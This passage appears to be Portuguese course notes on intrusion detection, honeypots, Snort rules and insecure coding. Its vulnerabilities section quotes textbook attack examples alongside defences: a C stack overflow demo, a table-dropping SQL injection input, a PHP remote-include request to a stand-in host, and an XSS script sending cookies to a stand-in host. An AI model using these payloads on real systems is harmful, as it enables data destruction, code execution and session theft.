distinção nítida entre um ataque e o uso normal. Existe alguma **sobreposição**, e o
trabalho do analisador é minimizá-la.

**O compromisso (slide 527):**

| Interpretação | Tenta                               | Resultado                                                  |
| ------------- | ----------------------------------- | ---------------------------------------------------------- |
| Frouxa        | Pegar o máximo possível de intrusos | Muitos **falsos positivos**: usuários vistos como intrusos |
| Estrita       | Limitar os falsos positivos         | Mais **falsos negativos**: intrusos não detectados         |

O ideal: maximizar a taxa de detecção e minimizar a taxa de falsos alarmes. A prática de IDS
é um compromisso e uma arte.

**A visão clássica (slide 528):** externos podem ser distinguidos de usuários legítimos com
confiança razoável, porque os padrões de comportamento legítimo vêm do histórico, e desvios
significativos (anomalias) são detectáveis. **Internos** são o caso mais difícil (Anderson):
a diferença entre o comportamento anormal e normal de um interno pode ser muito pequena,
então a busca de anomalias sozinha é insuficiente. Solução sugerida: uma definição
inteligente de condições (regras) que sugerem uso não autorizado.

**A falácia da taxa-base (slide 529):** os dois objetivos, alta taxa de detecção e baixa
taxa de falsos alarmes, são extremamente difíceis de alcançar juntos. O número real de
intrusões (a taxa-base) é muito baixo comparado ao uso legítimo. A menos que o IDS seja
extremamente discriminante, quase perfeito, a taxa de falsos alarmes será alta. Falsos
alarmes frequentes fazem os gestores ignorá-los, ou gastar muito tempo analisando-os. Uma
taxa de detecção baixa dá uma falsa sensação de segurança.

### 2.6 Requisitos de um IDS

Nove requisitos (slides 530 e 531). Um IDS deve:

1. Rodar continuamente com supervisão humana mínima.
2. Ser tolerante a falhas: recuperar-se de quedas e reinicializações.
3. Resistir a subversão: monitorar a si mesmo e detectar modificação por um atacante.
4. Impor sobrecarga mínima ao sistema monitorado.
5. Ser configurável conforme as políticas de segurança do sistema monitorado.
6. Adaptar-se a mudanças no comportamento do sistema e dos usuários ao longo do tempo.
7. Escalar para monitorar um grande número de hosts.
8. Evitar uma parada completa do serviço: se alguns componentes param, o resto é afetado o
   mínimo possível.
9. Permitir reconfiguração dinâmica sem reinicialização.

### 2.7 Abordagens de análise: anomalia e assinatura

Duas abordagens (slide 532): **detecção de anomalia** e **detecção por assinatura ou heurística**.

**Detecção de anomalia (slides 533 e 534):** coletar dados sobre o comportamento de usuários
legítimos ao longo do tempo, construindo uma **linha de base** do normal. Duas fases:

1. **Fase de treinamento:** construir um modelo de comportamento legítimo a partir dos dados
   dos sensores durante a operação normal. Pode ocorrer em momentos distintos ou ser uma
   evolução contínua do modelo.
2. **Fase de detecção:** comparar o comportamento observado com o modelo e classificá-lo
   como legítimo ou anômalo.

**Três categorias de classificação de anomalia (slides 535 a 539):**

1. **Estatística (slide 536).** Um perfil estatístico das métricas observadas. Univariada
   trata cada métrica como independente (grosseira, ineficaz). Multivariada considera
   correlações entre métricas (melhor discriminação). Série temporal usa a ordem e o tempo
   entre eventos (melhor ainda). Vantagens: simplicidade relativa, baixo custo
   computacional, nenhuma suposição sobre o comportamento esperado. Desvantagens: difícil
   selecionar métricas adequadas (o equilíbrio entre falsos positivos e negativos); nem todo
   comportamento pode ser modelado assim.
2. **Baseada em conhecimento (slide 537).** Um sistema especialista classifica os dados
   observados com um conjunto de regras que modelam o comportamento legítimo. Na fase de
   treinamento as regras são desenvolvidas, possivelmente à mão, para caracterizar os dados
   de treinamento em classes distintas, com ferramentas formais como máquinas de estados
   finitos e linguagens de descrição. Vantagens: robustez e flexibilidade. Desvantagens:
   dificuldade e tempo para desenvolver regras de alta qualidade; especialistas humanos
   necessários.
3. **Aprendizado de máquina (slide 538).** Técnicas de mineração de dados desenvolvem o
   modelo automaticamente a partir dos dados normais de treinamento. O treinamento exige
   tempo e recursos computacionais significativos; uma vez que o modelo existe, a
   classificação costuma ser eficiente. Vantagens: flexibilidade, adaptabilidade, captura
   interdependências complexas entre métricas. Desvantagens: depende de suposições sobre o
   comportamento aceito; a taxa de falsos alarmes é atualmente inaceitavelmente alta; alto
   custo de recursos para treinar.

Abordagens de aprendizado de máquina tentadas com sucesso variado: redes bayesianas
(relações probabilísticas), modelos de Markov (estados com probabilidades de transição),
redes neurais, lógica fuzzy (raciocínio aproximado, acomoda incerteza), algoritmos genéticos
(desenvolvem regras de classificação), agrupamento e detecção de outliers (dado novo dentro
de um agrupamento é normal, um outlier é uma anomalia).

**Detecção por assinatura ou heurística (slides 540 a 542),** também chamada **detecção de
mau uso:** um conjunto de padrões maliciosos conhecidos ou regras de ataque. O comportamento
observado é comparado com eles. Uma correspondência significa um intruso.

- **Assinaturas** comparam os dados coletados com padrões conhecidos de dados maliciosos.
  Precisam de detalhe suficiente para minimizar falsos alarmes e ainda detectar uma fração
  suficiente dos dados maliciosos. Usadas amplamente em produtos antivírus, proxies de
  varredura de tráfego de rede e NIDS. **Vantagens:** custo relativamente baixo em tempo e
  recursos, ampla aceitação. **Desvantagens:** esforço significativo para identificar e
  revisar comportamento novo para construir assinaturas; **não detecta ataques de dia
  zero**, para os quais não existe assinatura.
- **Heurísticas** usam regras para identificar ataques conhecidos, ou ataques a fraquezas
  conhecidas, e comportamento suspeito mesmo dentro dos padrões de uso estabelecidos. A
  fonte mais fértil de regras é a análise de ferramentas e scripts de ataque coletados na
  Internet, complementada por regras de especialistas. As regras são tipicamente
  específicas da máquina e do SO. O **Snort** é um NIDS baseado em regras com uma grande
  coleção de regras.

**Comparação para a lista 9:**

| Critério         | Detecção por assinatura                  | Detecção de anomalia                             |
| ---------------- | ---------------------------------------- | ------------------------------------------------ |
| Detecta          | Comportamento conhecido, catalogado      | Desvios da linha de base, mesmo desconhecidos    |
| Ataques dia zero | Não: não existe assinatura               | Possível: o ataque desvia do normal              |
| Falsos positivos | Baixos, se as assinaturas são detalhadas | Mais altos: sobreposição; taxa de ML inaceitável |
| Custo            | Baixo em execução; esforço nas regras    | Treinamento (ML caro); especialistas para regras |
| Adaptabilidade   | Uma nova assinatura por novo ataque      | O modelo evolui com o comportamento              |

### 2.8 IDS baseado em host (HIDS)

**Definição (slide 543):** uma camada especializada de software de segurança em sistemas
vulneráveis ou sensíveis, como servidores de banco de dados e sistemas administrativos.
Monitora a atividade dentro do sistema. Propósitos: detectar intrusões, registrar eventos
suspeitos, enviar alertas. Usa as duas abordagens de análise.

**Quatro fontes de dados para os sensores (slides 544 e 545):**

1. **Rastros de chamadas de sistema:** um registro da sequência de chamadas de sistema
   feitas pelos processos. Amplamente reconhecido como a fonte preferida para HIDS.
   Vantagem: funciona bem em Unix e
   Linux. Desvantagem: problemático no Windows, onde o uso extensivo de DLLs obscurece qual
   processo faz qual chamada.
2. **Registros de auditoria:** a maioria dos SOs modernos inclui software de contabilidade
   que coleta a atividade do usuário. Vantagem: nenhum software extra de coleta.
   Desvantagens: os registros podem não ter a informação necessária ou um formato
   conveniente; intrusos podem manipular os logs para esconder suas ações.
3. **Somas de verificação de integridade de arquivos:** varredura periódica de arquivos
   críticos (arquivos do sistema), comparando os hashes atuais com uma linha de base de
   valores conhecidos. Desvantagens: as somas corretas precisam ser geradas e protegidas;
   arquivos que mudam legitimamente o tempo todo são difíceis de monitorar.
4. **Acesso ao Registro:** usado no Windows, dada a quantidade de informação e de acessos
   que os programas fazem ao Registro. Desvantagem: muito específico do Windows, sucesso limitado.

Função do sensor: coletar dados, filtrá-los em um formato padrão, encaminhá-los ao analisador.

**HIDS de anomalia em Linux e UNIX (slides 546 e 547):** a maior parte do trabalho foi feita
aí porque os dados são fáceis de coletar. Fonte preferida: rastros de chamadas de sistema,
porque as chamadas de sistema são a forma de os programas alcançarem as funções do kernel, e
dão informação detalhada sobre a atividade dos processos. Motores de decisão: a abordagem
original **STIDE** compara as sequências de chamadas observadas com as sequências normais do
treinamento para obter uma **razão de discordância**. Alternativas do aprendizado de máquina:
modelos ocultos de Markov (HMM), redes neurais artificiais (ANN), máquinas de vetores de
suporte (SVM), máquinas de aprendizado extremo (ELM). O desempenho é medido por taxa de
detecção, falsos positivos e velocidade de detecção.

**HIDS por assinatura (slide 548):** a base do software **antivírus**, em PCs clientes,
dispositivos móveis, e embutido em proxies de e-mail e web e em NIDS. Duas técnicas:
**assinaturas** (um banco de dados de padrões de arquivo encontrados em malware conhecido)
e **heurísticas** (regras que caracterizam comportamento malicioso conhecido). Muito
eficiente contra malware conhecido. Não detecta ataques de dia zero, porque o ataque novo
não corresponde a nenhuma assinatura ou regra. Amplamente usado no Windows, ainda um alvo
principal de intrusos.

**HIDS distribuído (slide 549):** o trabalho tradicional de HIDS ficava isolado em um
sistema. Uma organização defende uma coleção distribuída de hosts, então uma defesa mais
eficaz vem da coordenação e cooperação entre os IDSs pela rede.

### 2.9 IDS baseado em rede (NIDS)

**Definição (slide 550):** monitora o tráfego em pontos selecionados de uma rede, pacote a
pacote, em tempo real ou próximo disso. Analisa a atividade nos protocolos de rede (L3),
transporte (L4) e aplicação (L7). **Contraste:** o NIDS examina o tráfego de pacotes
dirigido aos sistemas; o HIDS examina a atividade de usuários e software dentro de um host.
O NIDS é tipicamente parte da infraestrutura de perímetro, embutido no firewall ou ao lado
dele, focado em tentativas de intrusão externas. Arquitetura típica: sensores (monitoram o
tráfego), servidores de gerência (análise), consoles de gerência (interface humana).

**A grande limitação: criptografia (slide 552).** Com o uso crescente de TLS/SSL, os NIDS
perderam acesso a carga útil significativa. Não conseguem ver comandos maliciosos dentro de
uma sessão HTTPS. Os NIDS continuam importantes mas só podem ser parte da solução (defesa em
profundidade).

**Dois modos de sensor:**

1. **Sensor em linha:** inserido em um segmento de rede, de modo que o tráfego precisa
   passar por ele. Pode ser combinado com um firewall ou um switch. Vantagem: pode
   **bloquear** um ataque ao detectá-lo, atuando como IDS e IPS.
2. **Sensor passivo:** o mais comum. Monitora uma **cópia** do tráfego; o tráfego real não
   passa pelo dispositivo. Vantagem: mais eficiente, nenhum passo extra de tratamento,
   nenhum atraso adicional de pacote.

**Configuração passiva (slide 553):** o sensor conecta-se ao meio (cabo de fibra óptica) por
uma **derivação** (tap), que lhe dá uma cópia de todo o tráfego. A **NIC 1 (coleta)** está
conectada à derivação, normalmente não tem endereço IP, e coleta tudo em modo promíscuo. A
**NIC 2 (gerência)** tem endereço IP e fala com o servidor de gerência do NIDS.

**Sensores sem fio:** em linha (embutido em um ponto de acesso) ou passivo (monitorando o
ar). Só sensores sem fio podem analisar o tráfego de protocolo sem fio e detectar ataques
específicos (DoS sem fio, sequestro de sessão, AP falso). Um **WIDS** é um NIDS focado só em
redes sem fio.

**O pipeline do Snort (figura, slide 551):**

```
Network traffic -> Packet decoder -> Preprocessor -> Detection engine (rules)
-> Logging and alerting system -> Output modules -> Output: alert or log
```

### 2.10 Honeypots

**Definição (slide 554):** sistemas-isca projetados para atrair um atacante potencial para
longe dos sistemas críticos. **Três objetivos:**

1. **Desviar** o atacante dos sistemas críticos.
2. **Coletar informação** sobre a atividade, as técnicas e as ferramentas do atacante.
3. **Ganhar tempo:** encorajar o atacante a ficar tempo suficiente para os administradores responderem.

**A lógica:** o honeypot é preenchido com informação fabricada que parece valiosa mas que um
usuário legítimo nunca acessaria. Qualquer acesso é, por definição, suspeito. O sistema é
instrumentado com monitores e registradores sensíveis. Como o ataque parece ter sucesso, os
administradores podem rastrear o atacante sem expor os sistemas de produção.

**Valor (slide 555):** um recurso sem valor de produção. Qualquer comunicação de entrada é
provavelmente uma sondagem, varredura ou ataque. Se um honeypot inicia comunicação de
**saída**, ele provavelmente foi comprometido.

- **Honeypot de baixa interação:** um pacote de software que **emula** serviços ou sistemas
  (finge ser um servidor FTP). Dá uma interação inicial realista mas não roda os serviços
  completos. Vantagem (slide 556): suficiente para detectar os estágios iniciais de um
  ataque (varredura, sondagem) e alertar, como componente de um IDS distribuído.
- **Honeypot de alta interação:** um sistema real, com SO completo e serviços e aplicações
  reais, instrumentado e colocado onde atacantes podem alcançá-lo. Vantagens: um alvo muito
  mais realista; pode prender um atacante por muito tempo. Desvantagens: muito mais recursos;
  e se comprometido, pode ser usado para atacar outros sistemas na Internet, com problemas
  jurídicos ou de reputação para a organização.

**Honeynet:** o Honeynet Project constrói redes inteiras de honeypots que emulam uma
empresa, com tráfego simulado.

**Três posições de implantação (slides 557 a 560):**

1. **Externo, na Internet antes do firewall externo (slide 558).** Vantagens: rastreia
   tentativas de conexão a IPs não usados (varreduras); nenhum risco adicional à rede
   interna, porque o perigo de um sistema comprometido atrás do firewall é evitado; reduz o
   ruído, pois atrai muitos ataques e assim menos alertas chegam ao firewall e aos sensores
   IDS internos. Desvantagem: pouca ou nenhuma capacidade de capturar atacantes internos.
2. **DMZ, entre os dois firewalls (slide 559).** Vantagem: monitora ataques aos serviços
   públicos (web, correio, DNS). Desvantagens: risco de contaminação, os outros sistemas da
   DMZ precisam ser protegidos contra o honeypot; conflito com o firewall externo, que
   bloqueia tráfego desnecessário para a DMZ (só portas 80 e 443), então o administrador
   precisa ou abrir o firewall e aumentar o risco, ou limitar o honeypot, que então perde os
   ataques bloqueados.
3. **Interno, na rede corporativa depois do firewall (slide 560).** Vantagens: a mais
   importante, captura **ataques internos**; detecta um firewall mal configurado que
   encaminha tráfego da Internet para dentro. Desvantagens: alto risco, um honeypot
   comprometido ataca outros sistemas internos; o firewall não bloqueia o tráfego do
   atacante para o honeypot, pois é tráfego "permitido"; o firewall interno precisa de
   regras de exceção.

**Honeyfiles (slide 560):** emulam documentos legítimos com nomes realistas, como
"Salarios Diretoria.xlsx", como isca. Qualquer acesso é suspeito, porque usuários legítimos
não deveriam abri-los.

### 2.11 A regra do Snort

A regra no slide 561 e na lista 9:

```
alert tcp $HOME_NET any -> $EXTERNAL_NET ![7680,1521]
(msg:"ET P2P BitTorrent peer sync";
 flow:established,to_server;
 content:"|00 00 00 0d 06 00|"; depth:6;
 threshold: type limit, track by_dst, seconds 300, count 1;
 reference:url,bitconjurer.org/BitTorrent/protocol.html;
 classtype:policy-violation; sid:2000334; rev:14;
 metadata:created_at 2010_07_30, confidence Medium,
 signature_severity Informational, updated_at 2025_06_30;)
```

**Cabeçalho (slide 562):**

| Parte                        | Significado                                           |
| ---------------------------- | ----------------------------------------------------- |
| `alert`                      | A ação: gerar um alerta quando a condição é atendida  |
| `tcp`                        | O protocolo: só tráfego TCP                           |
| `$HOME_NET any`              | Origem: a rede interna, qualquer porta                |
| `->`                         | Sentido: da origem para o destino                     |
| `$EXTERNAL_NET ![7680,1521]` | Destino: a rede externa, exceto as portas 7680 e 1521 |

**Opções (slides 563 e 564):**

| Opção                               | Função                                                                  |
| ----------------------------------- | ----------------------------------------------------------------------- |
| `msg:"ET P2P BitTorrent peer sync"` | A mensagem mostrada nos logs                                            |
| `flow:established,to_server`        | Só conexões TCP estabelecidas, no sentido do servidor                   |
| `content:"\|00 00 00 0d 06 00\|"`   | Busca a sequência de bytes 00 00 00 0d 06 00                            |
| `depth:6`                           | Busca só nos primeiros 6 bytes da carga útil                            |
| `threshold: type limit, ...`        | `track by_dst, seconds 300, count 1`: 1 alerta por destino a cada 300 s |
| `reference:url,...`                 | Link para a documentação do protocolo BitTorrent                        |
| `classtype:policy-violation`        | Categoria: violação de política                                         |
| `sid:2000334`                       | Identificador único da regra                                            |
| `rev:14`                            | Número de revisão 14                                                    |
| `metadata`                          | Criada em 2010_07_30, atualizada em 2025_06_30, confiança Medium        |

Material externo:

- NIST CSRC, artigo: [SP 800-61 Rev. 3, Incident Response Recommendations and Considerations for Cybersecurity Risk Management](https://csrc.nist.gov/pubs/sp/800/61/r3/final)
  O guia de resposta a incidentes que os slides citam para os exemplos de intrusão.
- The Honeynet Project, site: [honeynet.org](https://www.honeynet.org/)
  O projeto citado no slide 556.
- Snort, documentação: [Snort 3 rule writing](https://docs.snort.org/rules/)
  A referência para cabeçalhos e opções de regra como `flow`, `content`, `depth` e `threshold`.

---

## PARTE 3: Vulnerabilidades de software (Aula 16)

### 3.1 A raiz do problema

Muitas vulnerabilidades de segurança resultam de **más práticas de programação** (slide 566).
A consciência dessas falhas é o primeiro passo para código mais seguro. O **OWASP Top 10**
de riscos em aplicações web inclui **cinco** falhas diretamente ligadas a código inseguro:

1. Entrada não validada.
2. Cross-site scripting (XSS).
3. Estouro de buffer.
4. Falhas de injeção.
5. Tratamento de erro inadequado.

**CWE/SANS Top 25 Most Dangerous Software Errors (slides 567 a 570):** o consenso sobre as
práticas que causam a maioria dos ataques cibernéticos, em **três categorias**.

1. **Interação insegura entre componentes (slide 568):** injeção de SQL (neutralização
   inadequada de elementos especiais em um comando SQL); injeção de comando do SO;
   cross-site scripting (neutralização inadequada da entrada durante a geração de página
   web); upload irrestrito de arquivo de tipo perigoso; cross-site request forgery (CSRF);
   redirecionamento de URL para site não confiável (open redirect).
2. **Gerência arriscada de recursos (slide 569):** cópia de buffer sem verificar o tamanho
   da entrada (estouro de buffer); limitação inadequada de um caminho a um diretório
   restrito (path traversal); download de código sem verificação de integridade; inclusão
   de funcionalidade de uma esfera de controle não confiável; uso de função potencialmente
   perigosa; cálculo incorreto do tamanho do buffer; string de formato não controlada;
   estouro de inteiro ou wraparound.
3. **Defesas porosas (slide 570):** falta de autenticação em função crítica; falta de
   autorização; credenciais fixas no código; falta de cifragem de dados sensíveis;
   dependência de entradas não confiáveis em uma decisão de segurança; execução com
   privilégios desnecessários; autorização incorreta; atribuição incorreta de permissão a
   um recurso crítico; uso de algoritmo criptográfico quebrado ou arriscado; restrição
   inadequada de tentativas excessivas de autenticação; hash de mão única sem sal.

### 3.2 Falha de software versus segurança de software

**Falhas de programa (slide 571)** resultam de entrada não prevista, interação com o sistema,
ou código incorreto. Espera-se que sigam alguma distribuição de probabilidade. A abordagem
usual de qualidade usa projeto estruturado e testes para remover tantos bugs quanto
razoavelmente possível. Os testes cobrem variações prováveis de entrada e erros comuns. A
preocupação principal não é o número total de bugs, mas com que frequência são disparados.

**A segurança de software difere (slide 572):** o **atacante escolhe a distribuição de
probabilidade**, mirando bugs específicos cuja falha é explorável. Esses bugs são disparados
por entradas que diferem drasticamente do esperado, então é improvável que testes comuns os
encontrem. Código seguro exige atenção a cada aspecto de como o programa roda, seu ambiente
e seus dados. Nada pode ser suposto, e todo erro potencial precisa ser verificado.

**Programação defensiva (ou segura) (slide 573):** o processo de projetar e implementar
software de modo que continue funcionando mesmo sob ataque. O software detecta condições
errôneas causadas por um ataque e ou continua com segurança ou **falha de forma graciosa**.
**A regra principal:** nunca supor nada, verificar toda suposição, tratar todo estado de
erro possível.

**O modelo abstrato (slide 574):** um programa lê entrada de várias fontes, processa-a por um
algoritmo, e produz saída para vários destinos. Roda no ambiente de um SO, com as instruções
de máquina de um processador, usando chamadas de sistema e possivelmente outros programas. A
execução pode salvar ou alterar dados no sistema ou causar outros efeitos colaterais. Tudo
isso interage, muitas vezes de formas complexas. A definição exige que as suposições sobre a
execução e os tipos de entrada sejam explícitas.

**Pressão de negócio (slide 575):** programadores focam nos passos para o sucesso e no fluxo
normal, não em cada ponto de falha. Tratar erros corretamente aumenta o código e o tempo de
desenvolvimento, o que conflita com prazos curtos e vantagem de mercado. A menos que a
segurança seja um objetivo de projeto desde o início, um programa seguro é improvável.

**Manutenção (slide 576):** nas mudanças, verificar suposições, tratar todos os erros,
checar as interações com o código existente. Falhar nisso pode introduzir vulnerabilidades
em um programa que era seguro.

**A mentalidade defensiva (slide 577):** uma mentalidade diferente de "a maioria dos usuários,
na maior parte do tempo". **"Paranoia é uma virtude":** o crescimento dos relatos de
vulnerabilidade prova a ameaça. Testes normais não encontram vulnerabilidades disparadas por
entrada altamente incomum. Os programas precisam ser tão resilientes quanto possível a
qualquer erro ou condição inesperada.

**Maturidade (slides 578 e 579):** outras disciplinas de engenharia tratam segurança e
confiabilidade como objetivos de projeto, e a sociedade não tolera pontes, prédios ou
aeronaves que desabam. O software não alcançou essa maturidade; a sociedade tolera níveis de
falha muito mais altos. Normas: **ISO 12207** (processos do ciclo de vida de software),
SEI06. O **SAFECode** (Software Assurance Forum for Excellence in Code), formado por grandes
empresas de TI, publica melhores práticas para garantia de software e desenvolvimento seguro.
A **modelagem de ameaças** (análise de risco) deve fazer parte do processo de projeto (slide 580).

**Quatro áreas críticas de interação (slide 581):**

1. Tratamento seguro da entrada (a questão inicial crítica).
2. Implementação do algoritmo.
3. Interação com outros componentes.
4. Saída do programa.

Muitas vulnerabilidades vêm de um pequeno conjunto de erros comuns.

### 3.3 Tratamento da entrada e estouro de buffer

**Entrada (slide 582):** qualquer fonte de dados fora do programa cujo valor o programador
não conhece ao escrever o código. Fontes óbvias: teclado, mouse, arquivos, conexões de rede.
Fontes indiretas: o ambiente de execução, arquivos de configuração, valores fornecidos pelo SO.

**Requisitos (slide 583):** identificar todas as fontes de entrada, declarar as suposições
sobre tamanho e tipo, verificá-las explicitamente no código, e usar os valores de forma
consistente com elas. **Duas preocupações:** o **tamanho** da entrada, e seu **significado e
interpretação**.

**Tamanho e estouro de buffer (slides 584 e 585):** programadores supõem um tamanho máximo
esperado (algumas linhas de texto) e alocam buffers fixos (512 ou 1024 bytes) sem verificar
se a entrada real cabe. Se a entrada excede o buffer, o **estouro** pode comprometer a
execução. Testes comuns usam entradas esperadas e não o encontram. Rotinas de biblioteca
podem não limitar os dados copiados para o buffer, o que agrava. Prática segura: rotinas
seguras de cópia de string e buffer, e consciência do programador.

**Mentalidade de codificação segura (slides 586 e 587):** tratar qualquer entrada como
perigosa. Usar buffers de tamanho dinâmico, ou processar a entrada em blocos do tamanho do
buffer. Mesmo com buffers dinâmicos, verificar que o espaço requisitado não excede a memória
disponível. Em erro de tamanho ou memória, falhar de forma graciosa: processar em blocos,
descartar o excesso, ou terminar. Aplicar essas verificações onde quer que dados de valor
desconhecido entrem ou sejam tratados, para toda fonte de entrada.

**O exemplo da aula, um estouro de buffer na pilha (slides 588 e 589):**

```c
#include <stdio.h>
#include <string.h>

char *my_gets(char *s) {
    int c;
    char *p = s;
    while ((c = getchar()) != '\n' && c != EOF) {
        *p++ = c;                    /* no length check */
    }
    *p = '\0';
    return s;
}

void consulta_nome(char *s) {        /* pretend it comes from the database */
    strcpy(s, "Gabriel");
}

int main() {
    char var_outrasInfos[10];
    char var_nome[10];
    consulta_nome(var_nome);
    my_gets(var_outrasInfos);
    printf("Dados: Nome: %s \nOutras Informacoes: %s \n", var_nome, var_outrasInfos);
    printf("==Fim do Programa==\n");
    return 0;
}
```

```bash
gcc -o buffer_overlflow buffer_overlflow.c
./buffer_overlflow
```

1. Digite algo curto ("Teste"): o programa funciona.
2. Digite mais de 10 caracteres ("1234567890AAAAA"): `var_nome` ("Gabriel") é sobrescrito
   pelos caracteres excedentes, porque os dois buffers têm 10 bytes na pilha e `my_gets`
   nunca verifica o comprimento.
3. Com uma entrada longa o programa imprime o nome corrompido e depois
   `*** stack smashing detected ***: terminated`, e o shell informa SIGABRT.
   Essa mensagem significa que o GCC inseriu uma proteção que detectou a corrupção da pilha
   quando a função tentou retornar (slide 591).
4. Para reproduzir o ataque clássico, compile com `-fno-stack-protector` (slide 592), rode
   de novo, e procure o sinal em `man 7 signal`.

```bash
gcc -fno-stack-protector -o buffer_overlflow buffer_overflow.c
./buffer_overlflow
```

### 3.4 Interpretação da entrada

**Binário versus texto (slide 593):** o significado da entrada é tão crítico quanto o seu
tamanho. Para dados binários, o programa supõe que valores brutos representam inteiros,
floats, strings ou estruturas, e essa suposição precisa ser validada conforme os valores
são lidos. Exemplos: quadros Ethernet, pacotes IP, segmentos TCP; DNS, SNMP, NFS. Exigem
validação contra a especificação de sintaxe abstrata.

**Heartbleed (slide 594):** o bug do OpenSSL de **2014**. Uma falha em verificar a validade
de um valor de entrada binário: o código não verificava a quantidade de dados pedida para
retorno contra a quantidade fornecida. Classificado como **leitura excessiva de buffer**.
Atacantes leram memória adjacente e vazaram nomes de usuário, senhas, chaves privadas e
outros dados sensíveis.

**Texto e conjuntos de caracteres (slides 595 e 596):** bytes brutos são interpretados como
caracteres conforme um conjunto de caracteres, tradicionalmente ASCII, com extensões
diferentes para caracteres acentuados no Windows e no macOS, e internacionalização crescente
hoje. O programa precisa identificar qual conjunto está em uso. Além dos caracteres, o
significado precisa ser identificado (inteiro, float, nome de arquivo, URL, e-mail) e o tipo
confirmado. A falha permite a um atacante influenciar a operação do programa.

**Ataques de injeção (slides 597 e 599):** exploram a falha em validar a interpretação da
entrada. Dados de entrada influenciam, por acidente ou de propósito, o fluxo de execução.
Mecanismo comum: a entrada é passada como parâmetro a um programa auxiliar cuja saída o
programa original usa. Frequente em linguagens de script (Perl, PHP, Python, sh) que reúsam
utilitários do sistema, e em scripts CGI web que processam dados de formulários HTML.
Defesas: validação da entrada, e tratamento correto de entrada internacionalizada.

**Desserialização insegura (slide 598):** a serialização converte objetos em um fluxo de
bytes e os reconstrói depois, uma forma complexa de interpretação de entrada binária. A
vulnerabilidade: a aplicação aceita objetos serializados de fontes não confiáveis e supõe que
o fluxo é um objeto válido e seguro. O atacante manipula os bytes, e durante a reconstrução o
sistema roda a lógica do atacante, muitas vezes **execução remota de código (RCE)**.

**Injeção de SQL (slide 600):** a entrada do usuário constrói uma requisição SQL. PHP vulnerável:

```php
$name = $_REQUEST['name'];
$query = "SELECT * FROM suppliers WHERE name = '" . $name . "';";
$result = mysql_query($query);
```

A entrada `Bob` funciona como esperado. A entrada `Bob'; drop table suppliers` recupera o
registro e apaga a tabela inteira. Semelhante à injeção de comando, mas com metacaracteres
SQL. **Prevenção:** validar a entrada antes do uso (escapar metacaracteres ou rejeitar), usar
as funções de sanitização da linguagem, usar **placeholders ou parâmetros SQL** em vez de
concatenação, combinar com stored procedures.

**Injeção de código (slides 601 e 602):** a entrada inclui código que o sistema atacado roda
depois. Cenário PHP: variáveis constroem nomes de arquivo em scripts de inclusão.

```php
include $path . 'functions.php';
include $path . 'data/prefs.php';
```

O script é chamado diretamente, contornando a intenção original, usando dois recursos do PHP:
variáveis globais atribuídas a partir da requisição HTTP, e `include` aceitando URLs remotas.

```
GET /calendar/embed/day.php?path=http://hacker.site/hack.txt?&cmd=ls
```

`$path` recebe a URL do atacante e o arquivo remoto roda com os privilégios do servidor web.
**Defesas:** bloquear a atribuição automática de campos de formulário a variáveis globais
(guardá-los em um array e buscar por nome, o padrão no PHP mais novo; pode quebrar código
legado); usar só valores constantes em `include` e `require`, ou validar uma variável
rigorosamente logo antes do uso. Outras variantes: injeção de e-mail, string de formato,
injeção de interpretador. A necessidade crítica: identificar todas as fontes de entrada,
validar as suposições antes do uso, entender como cada função ou serviço interpreta os
valores que recebe.

**Cross-site scripting, XSS (slides 603 e 604):** código injetado em um livro de visitas
envia o cookie da vítima ao atacante, permitindo personificação:

```html
Thanks for this information, its great!
<script>document.location='http://hacker.web.site/cookie.cgi?'+document.cookie</script>
```

**Ofuscação:** o atacante escreve o script com entidades de caracteres HTML
(`&#60;&#115;&#99;...` para `<sc...`). O navegador o interpreta de forma idêntica.
**Prevenção:** examinar a entrada do usuário, remover ou escapar código perigoso, e fazer os
validadores traduzirem as entidades HTML antes de verificar. **Natureza da falha:** uma falha
no tratamento tanto da entrada quanto da saída. O alvo real é o **próximo usuário**, não o
servidor. A sanitização da saída detém o ataque. Problemas semelhantes: CSRF e HTTP response
splitting (uso descuidado de entrada não confiável).

**Validação de sintaxe (slide 605):** garantir que os dados obedecem às suposições
(caracteres imprimíveis, formato de e-mail, inteiros) antes do uso.

| Estratégia       | Método                                       | Veredito                 |
| ---------------- | -------------------------------------------- | ------------------------ |
| **Lista branca** | Comparar com o que se quer, aceitar o válido | Recomendada              |
| **Lista negra**  | Comparar com valores perigosos conhecidos    | Falha a cada nova evasão |

Muitas vezes implementada com expressões regulares. Em caso de falha: rejeitar a entrada, ou
sanitizá-la escapando os metacaracteres.

**Canonicalização (slide 606):** caracteres têm múltiplas codificações (HTML, Unicode/UTF-8).
O caractere `/` tem várias representações UTF-8 além do padrão `2F`. Atacantes usam
codificações longas ou redundantes para contornar filtros (uma falha do Microsoft IIS nos
anos 1990). **Solução:** transformar a entrada em uma representação única, padrão e mínima
**antes da validação**. Usar bibliotecas anti-XSS ou frameworks web que automatizam isso.

**Valores numéricos (slide 607):** tamanhos fixos (8, 16, 32, 64 bits), com ou sem sinal.
Uma vulnerabilidade de **conversão de tipo** (casting) ocorre quando um valor é convertido
incorretamente entre tipos: um tamanho de buffer lido como sem sinal e depois comparado como
com sinal. Um valor muito grande, com o bit mais alto ligado, é lido como negativo, passa na
verificação de tamanho máximo, e estoura quando usado para alocação ou cópia.

**Fuzzing (slide 608):** uma técnica de teste de **Barton Miller (1989)** que usa dados
gerados aleatoriamente como entrada, para ver se o programa trata entrada anormal ou trava.
Vantagens: simples, barata, independente de suposições sobre a entrada esperada, encontra
falhas sérias e exploráveis. Limitação: pode perder bugs que exigem condições de entrada
muito específicas. Essencial para desenvolvedores (prevenção) e atacantes (descoberta de
vulnerabilidades).

### 3.5 Algoritmos, memória e concorrência

**Implementação do algoritmo (slide 609):** falhas de projeto ou implementação criam bugs
exploráveis. Exemplos: o gerador de números aleatórios previsível no **Netscape** antigo, que
permitia quebrar sua criptografia; **sequestro de sessão TCP** por números de sequência
iniciais previsíveis. O código de máquina precisa representar fielmente o algoritmo de alto
nível: **Ken Thompson (1984)** mostrou um compilador malicioso inserindo backdoors
invisíveis. **Código de depuração** deixado em produção pode permitir acesso indevido: o
**Morris Worm** explorou o comando DEBUG do sendmail.

**Interpretação de dados e memória (slide 610):** como os bits são lidos (inteiro, char,
ponteiro) depende das instruções de máquina. Linguagens fracamente tipadas como C permitem
manipulação direta de memória e ponteiros, o que facilita estouros de buffer e corrupção de
estruturas de dados. Defesa: linguagens fortemente tipadas, ou validação rigorosa das
conversões. Não liberar memória dinâmica causa **vazamentos de memória**, esgotamento de
recursos e DoS. Linguagens com gerência automática de memória (Java, C++ na redação do
slide) são preferíveis ao C manual.

